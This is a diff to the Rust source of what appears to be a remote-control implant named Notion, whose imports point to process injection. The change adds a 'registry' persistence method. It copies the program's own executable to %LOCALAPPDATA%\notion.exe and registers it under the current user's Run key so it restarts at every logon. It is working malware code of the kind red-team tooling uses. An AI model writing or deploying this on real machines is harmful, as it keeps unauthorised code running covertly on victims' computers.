@@ -1,5 +1,6 @@
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
+#[cfg(windows)] extern crate winreg;
 #[cfg(windows)] use std::ptr;
 use serde_json::to_string as json_to_string;
 use std::error::Error;
@@ -11,6 +12,8 @@ use std::fs::{write, File, copy as fs_copy};
 use std::env::{set_current_dir, current_dir, var, args};
 use std::process::Command;
 use reqwest::{Client};
+#[cfg(windows)] use winreg::{RegKey};
+#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
 use crate::config::ConfigOptions;
 
 #[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
@@ -217,6 +220,27 @@ impl NotionCommand {
                         } else {
                             return Ok("Couldn't get APPDATA location".to_string());
                         };
+                    },
+                    "registry" => {
+                        if let Ok(v) = var("LOCALAPPDATA") {
+                            let mut persist_path: String = v;
+                            persist_path.push_str(r"\notion.exe");
+                            let exe_path = args().nth(0).unwrap();
+                            println!("{exe_path}");
+                            // let mut out_file = File::create(path).expect("Failed to create file");
+                            fs_copy(&exe_path, &persist_path)?;
+                            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+                            let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
+                            let (key, disp) = hkcu.create_subkey(&path)?;
+                            match disp {
+                                REG_CREATED_NEW_KEY => println!("A new key has been created"),
+                                REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
+                            };
+                            key.set_value("Notion", &persist_path)?;
+                            Ok("Persistence accomplished".to_string())
+                        } else {
+                            Ok("LOCALDATA undefined".to_string())
+                        }
                     },
                     _ => Ok("That's not a persistence method!".to_string())                    
                 }
